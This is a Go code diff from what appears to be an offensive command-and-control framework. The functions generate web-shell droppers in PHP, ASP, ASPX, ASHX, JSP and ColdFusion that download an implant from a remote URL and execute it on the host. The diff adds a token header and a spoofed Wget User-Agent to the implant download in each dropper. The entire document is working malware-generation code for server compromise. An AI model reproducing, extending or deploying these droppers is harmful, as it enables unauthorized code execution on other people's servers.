@@ -7,7 +7,7 @@ import (
 )
 
 // GenerateDropperPHP returns a PHP dropper shell that downloads and executes an implant.
-func GenerateDropperPHP(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
+func GenerateDropperPHP(implantURL, binaryName string, inMemory bool, harpyToken string) (content, key string, err error) {
 	key, err = uuid.GenerateUUID()
 	if err != nil {
 		return "", "", fmt.Errorf("generating key: %w", err)
@@ -26,8 +26,15 @@ func GenerateDropperPHP(implantURL, binaryName string, inMemory bool) (content, 
 	content += "echo \"<pre>\";\n"
 	content += "if(isset($" + userKey + ") && $" + userKey + " === $" + authKeyVar + ") {\n"
 
-	if inMemory {
+	if harpyToken != "" {
+		content += "    $opts = array('http' => array('header' => \"User-Agent: Wget/1.21.4h (linux-gnu)\\r\\nToken: " + harpyToken + "\\r\\n\"));\n"
+		content += "    $ctx = stream_context_create($opts);\n"
+		content += "    $" + dataVar + " = file_get_contents(\"" + implantURL + "\", false, $ctx);\n"
+	} else {
 		content += "    $" + dataVar + " = file_get_contents(\"" + implantURL + "\");\n"
+	}
+
+	if inMemory {
 		content += "    if($" + dataVar + " === false) { echo \"Download failed\"; }\n"
 		content += "    else {\n"
 		content += "        $" + resultVar + " = proc_open(\n"
@@ -49,7 +56,6 @@ func GenerateDropperPHP(implantURL, binaryName string, inMemory bool) (content, 
 		content += "        } else { echo \"proc_open failed\"; }\n"
 		content += "    }\n"
 	} else {
-		content += "    $" + dataVar + " = file_get_contents(\"" + implantURL + "\");\n"
 		content += "    if($" + dataVar + " === false) { echo \"Download failed\"; }\n"
 		content += "    else {\n"
 		content += "        $" + pathVar + " = '/tmp/" + binaryName + "';\n"
@@ -72,7 +78,7 @@ func GenerateDropperPHP(implantURL, binaryName string, inMemory bool) (content, 
 }
 
 // GenerateDropperASP returns an ASP dropper shell that downloads and executes an implant.
-func GenerateDropperASP(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
+func GenerateDropperASP(implantURL, binaryName string, inMemory bool, harpyToken string) (content, key string, err error) {
 	key, err = uuid.GenerateUUID()
 	if err != nil {
 		return "", "", fmt.Errorf("generating key: %w", err)
@@ -95,6 +101,10 @@ func GenerateDropperASP(implantURL, binaryName string, inMemory bool) (content, 
 	content += "    Dim " + httpObj + "\n"
 	content += "    Set " + httpObj + " = Server.CreateObject(\"MSXML2.ServerXMLHTTP\")\n"
 	content += "    " + httpObj + ".Open \"GET\", \"" + implantURL + "\", False\n"
+	if harpyToken != "" {
+		content += "    " + httpObj + ".setRequestHeader \"User-Agent\", \"Wget/1.21.4h (linux-gnu)\"\n"
+		content += "    " + httpObj + ".setRequestHeader \"Token\", \"" + harpyToken + "\"\n"
+	}
 	content += "    " + httpObj + ".Send\n"
 	content += "    If " + httpObj + ".Status = 200 Then\n"
 
@@ -140,7 +150,7 @@ func GenerateDropperASP(implantURL, binaryName string, inMemory bool) (content, 
 }
 
 // GenerateDropperASPX returns an ASPX dropper shell that downloads and executes an implant.
-func GenerateDropperASPX(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
+func GenerateDropperASPX(implantURL, binaryName string, inMemory bool, harpyToken string) (content, key string, err error) {
 	key, err = uuid.GenerateUUID()
 	if err != nil {
 		return "", "", fmt.Errorf("generating key: %w", err)
@@ -165,6 +175,10 @@ func GenerateDropperASPX(implantURL, binaryName string, inMemory bool) (content,
 	content += "        Response.Write(\"<pre>\");\n"
 	content += "        try {\n"
 	content += "            WebClient wc = new WebClient();\n"
+	if harpyToken != "" {
+		content += "            wc.Headers.Add(\"User-Agent\", \"Wget/1.21.4h (linux-gnu)\");\n"
+		content += "            wc.Headers.Add(\"Token\", \"" + harpyToken + "\");\n"
+	}
 
 	if inMemory {
 		content += "            byte[] " + dataVar + " = wc.DownloadData(\"" + implantURL + "\");\n"
@@ -197,7 +211,7 @@ func GenerateDropperASPX(implantURL, binaryName string, inMemory bool) (content,
 }
 
 // GenerateDropperASHX returns an ASHX dropper shell that downloads and executes an implant.
-func GenerateDropperASHX(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
+func GenerateDropperASHX(implantURL, binaryName string, inMemory bool, harpyToken string) (content, key string, err error) {
 	key, err = uuid.GenerateUUID()
 	if err != nil {
 		return "", "", fmt.Errorf("generating key: %w", err)
@@ -225,6 +239,10 @@ func GenerateDropperASHX(implantURL, binaryName string, inMemory bool) (content,
 	content += "        " + ctx + ".Response.Write(\"<pre>\");\n"
 	content += "        try {\n"
 	content += "            WebClient wc = new WebClient();\n"
+	if harpyToken != "" {
+		content += "            wc.Headers.Add(\"User-Agent\", \"Wget/1.21.4h (linux-gnu)\");\n"
+		content += "            wc.Headers.Add(\"Token\", \"" + harpyToken + "\");\n"
+	}
 
 	if inMemory {
 		content += "            byte[] " + dataVar + " = wc.DownloadData(\"" + implantURL + "\");\n"
@@ -258,7 +276,7 @@ func GenerateDropperASHX(implantURL, binaryName string, inMemory bool) (content,
 }
 
 // GenerateDropperJSP returns a JSP dropper shell that downloads and executes an implant.
-func GenerateDropperJSP(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
+func GenerateDropperJSP(implantURL, binaryName string, inMemory bool, harpyToken string) (content, key string, err error) {
 	key, err = uuid.GenerateUUID()
 	if err != nil {
 		return "", "", fmt.Errorf("generating key: %w", err)
@@ -280,7 +298,14 @@ func GenerateDropperJSP(implantURL, binaryName string, inMemory bool) (content, 
 	content += "if (" + userKey + " != null && " + userKey + ".equals(" + authKeyVar + ")) {\n"
 	content += "    try {\n"
 	content += "        URL " + urlVar + " = new URL(\"" + implantURL + "\");\n"
-	content += "        InputStream " + streamVar + " = " + urlVar + ".openStream();\n"
+	if harpyToken != "" {
+		content += "        HttpURLConnection conn = (HttpURLConnection) " + urlVar + ".openConnection();\n"
+		content += "        conn.setRequestProperty(\"User-Agent\", \"Wget/1.21.4h (linux-gnu)\");\n"
+		content += "        conn.setRequestProperty(\"Token\", \"" + harpyToken + "\");\n"
+		content += "        InputStream " + streamVar + " = conn.getInputStream();\n"
+	} else {
+		content += "        InputStream " + streamVar + " = " + urlVar + ".openStream();\n"
+	}
 	content += "        ByteArrayOutputStream " + bufVar + " = new ByteArrayOutputStream();\n"
 	content += "        byte[] " + dataVar + " = new byte[4096];\n"
 	content += "        int n;\n"
@@ -334,7 +359,7 @@ func GenerateDropperJSP(implantURL, binaryName string, inMemory bool) (content, 
 }
 
 // GenerateDropperCFM returns a CFM dropper shell that downloads and executes an implant.
-func GenerateDropperCFM(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
+func GenerateDropperCFM(implantURL, binaryName string, inMemory bool, harpyToken string) (content, key string, err error) {
 	key, err = uuid.GenerateUUID()
 	if err != nil {
 		return "", "", fmt.Errorf("generating key: %w", err)
@@ -348,8 +373,14 @@ func GenerateDropperCFM(implantURL, binaryName string, inMemory bool) (content, 
 	content = "<cfparam name=\"URL.key\" default=\"\">\n"
 	content += "<cfset " + authKeyVar + " = \"" + key + "\">\n"
 	content += "<cfif URL.key EQ " + authKeyVar + ">\n"
-	content += "    <cfhttp url=\"" + implantURL + "\" method=\"GET\" result=\"" + httpVar + "\" getasbinary=\"yes\">\n"
-	content += "    </cfhttp>\n"
+	if harpyToken != "" {
+		content += "    <cfhttp url=\"" + implantURL + "\" method=\"GET\" result=\"" + httpVar + "\" useragent=\"Wget/1.21.4h (linux-gnu)\" getasbinary=\"yes\">\n"
+		content += "        <cfhttpparam type=\"header\" name=\"Token\" value=\"" + harpyToken + "\">\n"
+		content += "    </cfhttp>\n"
+	} else {
+		content += "    <cfhttp url=\"" + implantURL + "\" method=\"GET\" result=\"" + httpVar + "\" getasbinary=\"yes\">\n"
+		content += "    </cfhttp>\n"
+	}
 	content += "    <cfif " + httpVar + ".statusCode EQ \"200 OK\">\n"
 
 	if inMemory {
